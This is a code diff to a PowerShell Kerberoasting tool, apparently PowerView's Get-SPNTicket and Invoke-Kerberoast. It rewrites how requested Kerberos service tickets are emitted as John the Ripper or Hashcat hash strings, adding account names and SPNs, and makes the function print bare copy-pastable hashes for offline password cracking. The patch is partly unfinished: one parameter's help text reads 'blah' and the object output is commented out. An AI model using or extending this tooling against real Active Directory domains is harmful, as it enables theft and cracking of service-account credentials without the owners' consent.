@@ -469,6 +469,10 @@ Specifies a PowerView.User object (result of Get-NetUser) to request the ticket 
 Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
 Defaults to 'John'.
 
+.PARAMETER OutputHashesOnly
+True gives you just the hashes on copy/pastable format. False gives you a formatted list.
+Defaults to True
+
 .EXAMPLE
 
 Get-SPNTicket -SPN "HTTP/web.testlab.local"
@@ -571,17 +575,18 @@ Outputs a custom object containing the SamAccountName, DistinguishedName, Servic
                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
 
                 if ($OutputFormat -match 'John') {
-                    $HashFormat = "`$krb5tgs`$unknown:$Hash"
+                    $HashFormat = '$krb5tgs$' + $SamAccountName + ':' + $Hash
                 }
-                else {
+                else{
                     # hashcat output format
-                    $HashFormat = '$krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=proddfs,DC=pf,DC=fakedomain,DC=com SPN: E3514235-4B06-11D1-AB04-00C04FC2DCD2-ADAM/NAKCRA04.proddfs.pf.fakedomain.com:50000 *' + $Hash
+                    $HashFormat = '$krb5tgs$23$*SamAccountName: ' + $SamAccountName + ' ServicePrincipalName: ' + $Ticket.ServicePrincipalName + '*$' + $Hash   
                 }
                 $Out | Add-Member Noteproperty 'Hash' $HashFormat
-
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
-
-                Write-Output $Out
+		
+                #Write-Output $Out
+                Write-Output $HashFormat
+                 
                 break
             }
         }
@@ -649,6 +654,10 @@ for connection to the target domain.
 
 Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
 Defaults to 'John'.
+
+.PARAMETER OutputHashesOnly
+
+blah
 
 .EXAMPLE
 
@@ -751,6 +760,7 @@ Outputs a custom object containing the SamAccountName, DistinguishedName, Servic
 
         $GetSPNTicketArguments = @{}
         if ($PSBoundParameters['OutputFormat']) { $GetSPNTicketArguments['OutputFormat'] = $OutputFormat }
+        if ($PSBoundParameters['OutputHashesOnly']) { $GetSPNTicketArguments['OutputHashesOnly'] = $OutputHashesOnly }
 
     }
 
